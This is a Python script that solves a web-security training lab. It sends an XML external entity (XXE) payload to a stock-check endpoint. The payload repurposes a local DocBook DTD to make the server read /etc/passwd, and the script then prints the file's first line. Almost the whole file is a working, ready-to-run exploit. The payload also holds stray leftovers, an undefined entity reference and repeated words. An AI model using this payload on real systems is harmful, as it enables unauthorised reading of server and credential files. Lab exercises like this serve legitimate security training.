#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 18/10/2023
#
# Lab: Exploiting XXE to retrieve data by repurposing a local DTD
#
# Steps: 1. Inject payload into the XML-based check stock request to retrieve 
#           the content of /etc/passwd by repurposing a local DTD
#        2. Extract the first line as a proof
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a6d00ec0393e43d82f8fbac0097004a.web-security-academy.net"

print(Fore.BLUE + "âŸª#âŸ« Injection point: " + Fore.YELLOW + "XML-based check stock request")

# payload to retreive the content of /etc/passwd by repurposing a local DTD
payload = """<?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE foo [
                        <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
                        <!ENTITY % ISOamso '
                        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                        &#x25;eval;
                        &#x25;error;
                        '>
                        %local_dtd;
                        ]>
                        <stockCheck>
                            <productId>
                                &xxe;
                            </productId>
                            <storeId>
                                1
                            </storeId>external entities
                            external entities
                        </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Injecting payload to retrieve the content of /etc/passwd by repurposing a local DTD.. " + Fore.GREEN + "OK")

# extract the first line of /etc/passwd
first_line = re.findall("(root.*)\n", injection.text)[0]

print(Fore.WHITE + "â¦—2â¦˜ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
print(Fore.WHITE + "ðŸ—¹ Check your browser, it should be marked now as " + Fore.GREEN + "solved")


